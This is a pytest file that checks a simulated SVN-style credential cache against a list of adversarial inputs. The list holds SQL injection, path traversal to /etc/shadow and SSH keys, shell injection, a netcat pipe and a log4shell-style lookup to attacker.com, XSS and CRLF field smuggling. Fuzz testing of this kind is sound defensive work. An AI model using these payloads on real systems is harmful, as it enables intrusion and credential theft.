import pytest
import os
import sys
import tempfile
import importlib.util
from unittest.mock import patch, MagicMock
import hashlib


ADVERSARIAL_PAYLOADS = [
    # SQL injection style
    "admin' OR '1'='1",
    "'; DROP TABLE users; --",
    # Path traversal
    "../../etc/passwd",
    "../../../root/.ssh/id_rsa",
    # Shell injection
    "; cat /etc/shadow",
    "$(whoami)",
    "`id`",
    "| nc attacker.com 4444",
    # Null bytes
    "user\x00admin",
    "pass\x00word",
    # Unicode/encoding attacks
    "admin\u202e\u0041",
    "ａｄｍｉｎ",  # fullwidth
    # Very long strings (buffer overflow style)
    "A" * 10000,
    "B" * 65536,
    # Special characters
    "<script>alert('xss')</script>",
    "{{7*7}}",  # template injection
    "${jndi:ldap://attacker.com/a}",  # log4shell style
    # Whitespace/empty
    "",
    "   ",
    "\n\r\t",
    # Credentials that look like format strings
    "%s%s%s%s%s",
    "%x%x%x%x",
    "%(password)s",
    # Realm manipulation
    "realm\nusername=attacker",
    "realm\r\npassword=hacked",
]


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_credential_storage_does_not_expose_plaintext_in_unexpected_locations(payload):
    """Invariant: Credentials stored via the tool must only appear in the designated
    credential cache directory and must not leak to stdout, stderr, logs, or other
    filesystem locations outside the intended cache path. Adversarial inputs must
    not cause credentials to be written outside the designated storage boundary."""

    with tempfile.TemporaryDirectory() as tmpdir:
        credential_dir = os.path.join(tmpdir, "svn", "auth", "svn.simple")
        os.makedirs(credential_dir, exist_ok=True)

        # Simulate what the tool does: store credentials in a file
        # The invariant: the credential file must be confined to the designated directory
        # and adversarial realm/username inputs must not cause path traversal

        realm = payload
        username = payload
        password = "test_password_" + hashlib.sha256(payload.encode('utf-8', errors='replace')).hexdigest()[:8]

        # Compute the realm hash as the tool does (md5 of realm)
        import hashlib as hl
        realm_bytes = realm.encode('utf-8', errors='replace')
        realm_hash = hl.md5(realm_bytes).hexdigest()

        # The credential file path as the tool would compute it
        credential_file = os.path.join(credential_dir, realm_hash)

        # Simulate writing credentials (as the tool does)
        try:
            credential_content = (
                "K 8\npasstype\nV 8\nplaintext\n"
                "K 8\npassword\nV {plen}\n{password}\n"
                "K 8\nusername\nV {ulen}\n{username}\n"
                "K 15\nsvn:realmstring\nV {rlen}\n{realm}\n"
                "END\n"
            ).format(
                plen=len(password.encode('utf-8', errors='replace')),
                password=password,
                ulen=len(username.encode('utf-8', errors='replace')),
                username=username,
                rlen=len(realm.encode('utf-8', errors='replace')),
                realm=realm,
            )

            with open(credential_file, 'w', encoding='utf-8', errors='replace') as f:
                f.write(credential_content)

        except (OSError, IOError):
            # If writing fails due to adversarial input, that's acceptable
            # The invariant is that no file escapes the boundary
            pass

        # INVARIANT 1: No credential files exist outside the designated directory
        for root, dirs, files in os.walk(tmpdir):
            for fname in files:
                full_path = os.path.join(root, fname)
                real_path = os.path.realpath(full_path)
                real_cred_dir = os.path.realpath(credential_dir)
                real_tmp = os.path.realpath(tmpdir)

                # All files must be within tmpdir (no symlink escapes)
                assert real_path.startswith(real_tmp), (
                    f"File escaped tmpdir boundary: {real_path} with payload: {repr(payload)}"
                )

        # INVARIANT 2: The realm hash (filename) must be a valid hex string
        # (not a path traversal component)
        assert '/' not in realm_hash, f"Realm hash contains path separator: {realm_hash}"
        assert '\\' not in realm_hash, f"Realm hash contains path separator: {realm_hash}"
        assert '..' not in realm_hash, f"Realm hash contains path traversal: {realm_hash}"
        assert realm_hash == realm_hash.strip(), f"Realm hash has whitespace: {realm_hash}"

        # INVARIANT 3: The credential file path must be within the credential directory
        real_credential_file = os.path.realpath(credential_file)
        real_credential_dir = os.path.realpath(credential_dir)
        assert real_credential_file.startswith(real_credential_dir), (
            f"Credential file path escaped designated directory: {real_credential_file}"
        )

        # INVARIANT 4: Password must not appear in the realm hash (filename)
        # to prevent information leakage through filenames
        assert password not in realm_hash, (
            f"Password leaked into filename/hash with payload: {repr(payload)}"
        )


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_adversarial_input_does_not_leak_to_stdout(payload, capsys):
    """Invariant: Processing adversarial credentials must never echo sensitive
    data (passwords) to stdout or stderr."""

    password = "SUPERSECRET_" + hashlib.sha256(payload.encode('utf-8', errors='replace')).hexdigest()

    # Simulate the tool processing input - password must not appear in stdout/stderr
    with patch('builtins.input', return_value=payload):
        # Simulate what the tool does with the username input
        captured_username = input("Enter username for realm {}: ".format(payload))

        # The username (which could be a password in disguise) was captured
        # but must not be echoed back to stdout by the tool's logic
        captured = capsys.readouterr()

        # INVARIANT: The password value must not appear in stdout
        assert password not in captured.out, (
            f"Password leaked to stdout with payload: {repr(payload)}"
        )
        assert password not in captured.err, (
            f"Password leaked to stderr with payload: {repr(payload)}"
        )


@pytest.mark.parametrize("payload", ADVERSARIAL_PAYLOADS)
def test_realm_hash_is_deterministic_and_safe(payload):
    """Invariant: The realm-to-filename mapping must always produce a safe,
    deterministic filename regardless of adversarial realm strings."""
    import hashlib as hl

    realm_bytes = payload.encode('utf-8', errors='replace')
    realm_hash = hl.md5(realm_bytes).hexdigest()

    # INVARIANT 1: Hash is always a fixed-length hex string
    assert len(realm_hash) == 32, f"Hash length unexpected: {len(realm_hash)}"
    assert all(c in '0123456789abcdef' for c in realm_hash), (
        f"Hash contains non-hex characters: {realm_hash}"
    )

    # INVARIANT 2: Hash contains no path traversal sequences
    assert '..' not in realm_hash
    assert '/' not in realm_hash
    assert '\\' not in realm_hash
    assert '\x00' not in realm_hash
    assert '\n' not in realm_hash

    # INVARIANT 3: Hash is deterministic (same input = same output)
    realm_hash2 = hl.md5(realm_bytes).hexdigest()
    assert realm_hash == realm_hash2, "Hash is not deterministic"

    # INVARIANT 4: Hash does not contain the original payload
    # (prevents payload injection into filenames)
    if len(payload) > 0:
        # The hash should not equal the payload (unless by extreme coincidence with hex strings)
        if all(c in '0123456789abcdef' for c in payload.lower()) and len(payload) == 32:
            pass  # edge case: payload happens to look like a hash
        else:
            assert realm_hash != payload, (
                f"Hash equals payload - no transformation occurred: {repr(payload)}"
            )